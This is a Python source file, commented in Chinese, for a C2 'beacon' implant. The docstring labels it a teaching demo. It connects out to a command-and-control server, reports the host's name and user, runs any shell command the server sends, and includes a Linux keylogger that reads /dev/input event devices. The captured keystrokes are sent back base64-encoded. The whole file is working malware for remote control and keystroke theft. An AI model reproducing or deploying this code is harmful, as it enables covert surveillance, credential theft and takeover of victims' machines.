#!/usr/bin/env python3
"""
C2 Beacon - WebShell 后门持久化通信模块

功能：
  1. 主动连接 C2 服务器，建立持久通信链路
  2. 接收并执行远程指令（任意系统命令）
  3. 键盘记录功能（可远程启停）
  4. 键盘数据加密回传至 C2 服务器

安全警告：此文件为安全教学演示用的 Beacon 样本！
         严禁用于任何非授权场景！
"""

import socket
import subprocess
import os
import time
import threading
import struct
import glob
import json
import base64
import sys
import select

# ========== 配置 ==========
C2_HOST = '192.168.163.1'
C2_PORT = 4444

# 如果通过命令行参数指定，则覆盖默认值
if len(sys.argv) >= 3:
    C2_HOST = sys.argv[1]
    C2_PORT = int(sys.argv[2])

# ========== 键盘记录器 ==========
EVENT_FORMAT = 'llHHI'
EVENT_SIZE = struct.calcsize(EVENT_FORMAT)

# Linux 内核键码到字符的映射
KEY_MAP = {
    1: '[ESC]', 2: '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 8: '7',
    9: '8', 10: '9', 11: '0', 12: '-', 13: '=', 14: '[BS]', 15: '[TAB]',
    16: 'q', 17: 'w', 18: 'e', 19: 'r', 20: 't', 21: 'y', 22: 'u', 23: 'i',
    24: 'o', 25: 'p', 26: '[', 27: ']', 28: '[ENT]', 29: '[LCTRL]',
    30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g', 35: 'h', 36: 'j', 37: 'k',
    38: 'l', 39: ';', 40: "'", 41: '`', 42: '[LSHIFT]', 43: chr(92),
    44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b', 49: 'n', 50: 'm',
    51: ',', 52: '.', 53: '/', 54: '[RSHIFT]', 56: '[LALT]',
    57: ' ', 58: '[CAPS]', 59: '[F1]', 60: '[F2]', 61: '[F3]',
    62: '[F4]', 63: '[F5]', 64: '[F6]', 65: '[F7]', 66: '[F8]',
    67: '[F9]', 68: '[F10]', 87: '[F11]', 88: '[F12]',
    69: '[NUMLOCK]', 70: '[SCRLOCK]',
    96: '[ENTER]', 97: '[RCTRL]', 100: '[RALT]',
    102: '[HOME]', 103: '[UP]', 104: '[PGUP]',
    105: '[LEFT]', 106: '[RIGHT]', 107: '[END]',
    108: '[DOWN]', 109: '[PGDN]', 110: '[INS]', 111: '[DEL]',
}

keylog_buffer = []
keylog_running = False
keylog_thread = None
keylog_device = None
shift_active = False
caps_active = False

# Shift 修饰后的字符映射
SHIFT_MAP = {
    '1': '!', '2': '@', '3': '#', '4': '$', '5': '%', '6': '^',
    '7': '&', '8': '*', '9': '(', '0': ')', '-': '_', '=': '+',
    '[': '{', ']': '}', chr(92): '|', ';': ':', "'": '"', '`': '~',
    ',': '<', '.': '>', '/': '?',
}


def find_keyboard_device():
    """查找所有 apache 可读的 event 设备（用于状态展示与统一监听）"""
    devices = sorted(glob.glob('/dev/input/event*'))
    readable = []
    for dev in devices:
        try:
            # 用非阻塞方式探测是否可读，避免 read() 阻塞
            fd = os.open(dev, os.O_RDONLY | os.O_NONBLOCK)
            os.close(fd)
            readable.append(dev)
        except (OSError, IOError):
            continue
    if not readable:
        keylog_buffer.append(
            '[!] 未找到任何 apache 可读的 /dev/input/event* 设备 '
            '(需将 apache 加入 input 组)\n'
        )
        return None
    return readable


def keylogger_loop():
    """键盘记录主循环 - 非阻塞监听全部可读 event 设备，捕获任意键盘事件"""
    global keylog_buffer, keylog_device, shift_active, caps_active

    devices = find_keyboard_device()
    if not devices:
        return

    # 以非阻塞方式打开所有设备，用 select 统一监听
    open_fds = []
    for dev in devices:
        try:
            fd = os.open(dev, os.O_RDONLY | os.O_NONBLOCK)
            open_fds.append(fd)
        except (OSError, IOError):
            continue

    if not open_fds:
        keylog_buffer.append('[!] 键盘设备存在但无法打开 (权限不足)\n')
        return

    keylog_device = ','.join(devices)
    keylog_buffer.append('[*] 键盘记录已启动, 监听设备: {}\n'.format(keylog_device))

    while keylog_running:
        try:
            rlist, _, _ = select.select(open_fds, [], [], 0.3)
        except OSError:
            time.sleep(0.1)
            continue

        for fd in rlist:
            try:
                while True:
                    try:
                        event = os.read(fd, EVENT_SIZE)
                    except (BlockingIOError, OSError):
                        break
                    if len(event) < EVENT_SIZE:
                        break
                    try:
                        _, _, etype, code, value = struct.unpack(EVENT_FORMAT, event)
                    except struct.error:
                        break
                    if etype != 1:  # EV_KEY 以外的事件忽略
                        continue
                    if value == 1:  # 按键按下
                        char = KEY_MAP.get(code, '')
                        # 处理修饰键
                        if code == 42 or code == 54:  # 左/右 Shift
                            shift_active = True
                            continue
                        if code == 58:  # CapsLock
                            caps_active = not caps_active
                            continue
                        if char:
                            if shift_active and char in SHIFT_MAP:
                                char = SHIFT_MAP[char]
                            elif shift_active or caps_active:
                                if len(char) == 1 and char.isalpha():
                                    char = char.upper()
                            keylog_buffer.append(char)
                    elif value == 0:  # 按键抬起
                        if code == 42 or code == 54:  # Shift 释放
                            shift_active = False
            except (OSError, BlockingIOError):
                continue

    # 退出时关闭所有 fd
    for fd in open_fds:
        try:
            os.close(fd)
        except OSError:
            pass


def start_keylogger():
    """启动键盘记录"""
    global keylog_running, keylog_thread
    if not keylog_running:
        keylog_running = True
        keylog_thread = threading.Thread(target=keylogger_loop, daemon=True)
        keylog_thread.start()
        return True
    return False


def stop_keylogger():
    """停止键盘记录"""
    global keylog_running
    keylog_running = False
    return True


def get_keylog_data():
    """获取并清空键盘记录缓冲区"""
    global keylog_buffer
    data = ''.join(keylog_buffer)
    keylog_buffer = []
    return data


# ========== C2 通信模块 ==========

def register_info(sock):
    """向 C2 发送注册信息"""
    try:
        hostname = subprocess.check_output(
            'hostname', shell=True, stderr=subprocess.DEVNULL
        ).decode().strip()
    except Exception:
        hostname = 'unknown'

    try:
        whoami = subprocess.check_output(
            'whoami', shell=True, stderr=subprocess.DEVNULL
        ).decode().strip()
    except Exception:
        whoami = 'unknown'

    info = {
        'type': 'register',
        'hostname': hostname,
        'user': whoami,
        'cwd': os.getcwd(),
        'pid': os.getpid(),
    }
    sock.sendall((json.dumps(info) + '\n').encode())


def execute_command(cmd):
    """执行系统命令并返回结果"""
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, timeout=30
        )
        output = result.stdout.decode(errors='replace')
        errors = result.stderr.decode(errors='replace')
        if errors:
            output += '\n[STDERR]\n' + errors
        if not output.strip():
            output = '(no output)'
        return output
    except subprocess.TimeoutExpired:
        return '[!] Command timed out (30s)'
    except Exception as e:
        return '[!] Error: {}'.format(e)


def beacon_loop():
    """Beacon 主循环 - 维持与 C2 的持久通信"""
    print("[*] C2 Beacon 启动")
    print("[*] 目标: {}:{}".format(C2_HOST, C2_PORT))

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            sock.connect((C2_HOST, C2_PORT))
            print("[+] 已连接到 C2 服务器")

            # 发送注册信息
            register_info(sock)
            print("[+] 注册信息已发送")

            # 持久通信循环
            while True:
                try:
                    data = sock.recv(4096)
                    if not data:
                        print("[-] C2 连接断开")
                        break

                    command = data.decode(errors='replace').strip()
                    if not command:
                        continue

                    print("[*] 收到指令: {}".format(command))

                    if command == 'ping':
                        sock.sendall(b'pong\n')

                    elif command == 'exit':
                        stop_keylogger()
                        sock.sendall(b'bye\n')
                        sock.close()
                        print("[*] 收到退出指令，Beacon 关闭")
                        return

                    elif command == 'keylog_on':
                        ok = start_keylogger()
                        msg = 'KEYLOG started' if ok else 'KEYLOG already running'
                        sock.sendall((msg + '\n').encode())
                        print("[*] 键盘记录已启动")

                    elif command == 'keylog_off':
                        stop_keylogger()
                        sock.sendall(b'KEYLOG stopped\n')
                        print("[*] 键盘记录已停止")

                    elif command == 'keylog_dump':
                        log_data = get_keylog_data()
                        # Base64 编码后回传
                        encoded = base64.b64encode(
                            log_data.encode(errors='replace')
                        ).decode()
                        sock.sendall(
                            ('KEYLOG_DATA ' + encoded + '\n').encode()
                        )
                        print("[*] 键盘数据已回传 ({} bytes)".format(len(log_data)))

                    elif command.startswith('exec '):
                        cmd = command[5:]
                        result = execute_command(cmd)
                        sock.sendall(
                            ('CMD_RESULT\n' + result + '\n__END__\n').encode()
                        )
                        print("[*] 命令执行完成: {}".format(cmd))

                    else:
                        sock.sendall(b'UNKNOWN_COMMAND\n')

                except socket.timeout:
                    # 发送心跳
                    try:
                        sock.sendall(b'HEARTBEAT\n')
                    except Exception:
                        print("[-] 心跳发送失败，连接断开")
                        break
                    continue

            sock.close()

        except ConnectionRefusedError:
            print("[-] C2 服务器未就绪，5 秒后重试...")
        except socket.timeout:
            print("[-] 连接超时，5 秒后重试...")
        except Exception as e:
            print("[-] 错误: {}，5 秒后重试...".format(e))

        time.sleep(5)


if __name__ == '__main__':
    beacon_loop()
